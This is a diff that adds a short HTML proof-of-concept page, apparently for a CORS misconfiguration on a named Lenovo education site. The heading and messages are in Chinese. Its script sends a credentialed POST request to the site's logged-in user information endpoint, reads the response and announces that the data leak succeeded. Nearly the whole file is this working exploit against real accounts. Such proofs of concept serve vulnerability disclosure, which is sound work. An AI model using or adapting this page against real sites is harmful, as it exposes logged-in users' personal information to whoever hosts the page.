@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lenovo CORS PoC</title>
+</head>
+<body>
+  <h3>Lenovo 教师信息泄露测试</h3>
+  <script>
+    fetch("https://teacher.educenter.lenovo.com/smartEducation/seuser/loginUserInfo", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: "{}"
+    })
+    .then(res => res.json())
+    .then(data => {
+      console.log("泄露数据：", data);
+      alert("数据泄露成功，请查看控制台！");
+    })
+    .catch(err => console.error("请求失败", err));
+  </script>
+</body>
+</html>
